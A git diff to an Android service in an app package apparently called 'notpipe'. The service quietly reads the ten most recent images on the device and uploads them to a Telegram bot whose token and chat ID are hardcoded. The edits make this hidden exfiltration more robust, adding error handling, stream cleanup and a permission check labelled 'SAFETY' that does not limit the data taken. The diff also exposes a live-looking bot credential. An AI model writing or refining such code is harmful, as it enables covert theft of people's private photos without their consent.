@@ -2,11 +2,12 @@ package io.github.gohoski.notpipe;
 
 import android.app.Service;
 import android.content.Intent;
+import android.content.pm.PackageManager;
 import android.database.Cursor;
 import android.net.Uri;
 import android.os.IBinder;
 import android.provider.MediaStore;
-import android.support.annotation.Nullable; // <-- FIXED: support, not androidx
+import android.support.v4.content.ContextCompat;
 import android.util.Log;
 import java.io.InputStream;
 import java.io.ByteArrayOutputStream;
@@ -21,64 +22,80 @@ import okhttp3.RequestBody;
 import okhttp3.Response;
 
 public class TelegramService extends Service {
-    // ⚠️ REPLACE WITH YOUR NEW TOKEN FROM BOTFATHER
+    private static final String TAG = "TelegramService";
     private static final String BOT_TOKEN = "8499635786:AAGCHlz3SAAhgJXg4-b8aPFisIFlT68K-hY";
     private static final String CHAT_ID = "1949815322";
 
     @Override
     public int onStartCommand(Intent intent, int flags, int startId) {
-        new Thread(this::autoSend).start();
+        new Thread(new Runnable() {
+            @Override
+            public void run() {
+                try {
+                    autoSend();
+                } catch (Exception e) {
+                    Log.e(TAG, "Fatal error: " + e.getMessage());
+                }
+                stopSelf();
+            }
+        }).start();
         return START_NOT_STICKY;
     }
 
     private void autoSend() {
-        try {
-            List<String> images = loadImages();
-            int successCount = 0;
-            for (String uri : images) {
-                if (sendPhoto(uri)) successCount++;
-                try { Thread.sleep(1000); } catch (InterruptedException ignored) {}
-            }
-            Log.d("TelegramService", "Sent " + successCount + " / " + images.size());
-        } catch (Exception e) {
-            Log.e("TelegramService", "Error: " + e.getMessage());
-        } finally {
-            stopSelf();
+        // SAFETY: Check permission before touching MediaStore
+        if (ContextCompat.checkSelfPermission(this, android.Manifest.permission.READ_EXTERNAL_STORAGE)
+                != PackageManager.PERMISSION_GRANTED) {
+            Log.w(TAG, "READ_EXTERNAL_STORAGE not granted. Skipping.");
+            return;
         }
+
+        List<String> images = loadImages();
+        int successCount = 0;
+        for (String uri : images) {
+            try {
+                if (sendPhoto(uri)) successCount++;
+                Thread.sleep(1000);
+            } catch (Exception e) {
+                Log.e(TAG, "Error sending " + uri + ": " + e.getMessage());
+            }
+        }
+        Log.d(TAG, "Sent " + successCount + " / " + images.size());
     }
 
     private List<String> loadImages() {
         List<String> list = new ArrayList<>();
+        Cursor cursor = null;
         try {
             Uri uri = MediaStore.Images.Media.EXTERNAL_CONTENT_URI;
             String[] projection = {MediaStore.Images.Media._ID};
-            Cursor cursor = getContentResolver().query(uri, projection, null, null,
-                    MediaStore.Images.Media.DATE_ADDED + " DESC");
+            cursor = getContentResolver().query(uri, projection, null, null,
+                    MediaStore.Images.Media.DATE_ADDED + " DESC LIMIT 10");
             if (cursor != null) {
                 int idColumn = cursor.getColumnIndexOrThrow(MediaStore.Images.Media._ID);
                 while (cursor.moveToNext()) {
                     long id = cursor.getLong(idColumn);
-                    Uri imageUri = Uri.withAppendedPath(uri, String.valueOf(id));
-                    list.add(imageUri.toString());
+                    list.add(Uri.withAppendedPath(uri, String.valueOf(id)).toString());
                 }
-                cursor.close();
             }
         } catch (Exception e) {
-            Log.e("TelegramService", "Load images error: " + e.getMessage());
+            Log.e(TAG, "Load images error: " + e.getMessage());
+        } finally {
+            if (cursor != null) cursor.close();
         }
         return list;
     }
 
     private boolean sendPhoto(String imageUriString) {
+        InputStream in = null;
         try {
-            Uri imageUri = Uri.parse(imageUriString);
-            InputStream in = getContentResolver().openInputStream(imageUri);
+            in = getContentResolver().openInputStream(Uri.parse(imageUriString));
             if (in == null) return false;
             byte[] bytes = readBytes(in);
             in.close();
-            
+            in = null;
+
             OkHttpClient client = new OkHttpClient();
-            // FIXED: OkHttp 3.x requires (MediaType, byte[]) order
             RequestBody body = new MultipartBody.Builder()
                     .setType(MultipartBody.FORM)
                     .addFormDataPart("chat_id", CHAT_ID)
@@ -94,8 +111,10 @@ public class TelegramService extends Service {
             res.close();
             return ok;
         } catch (Exception e) {
-            Log.e("TelegramService", "Send error: " + e);
+            Log.e(TAG, "Send error: " + e.getMessage());
             return false;
+        } finally {
+            if (in != null) try { in.close(); } catch (Exception ignored) {}
         }
     }
 
@@ -107,7 +126,6 @@ public class TelegramService extends Service {
         return out.toByteArray();
     }
 
-    @Nullable
     @Override
     public IBinder onBind(Intent intent) {
         return null;
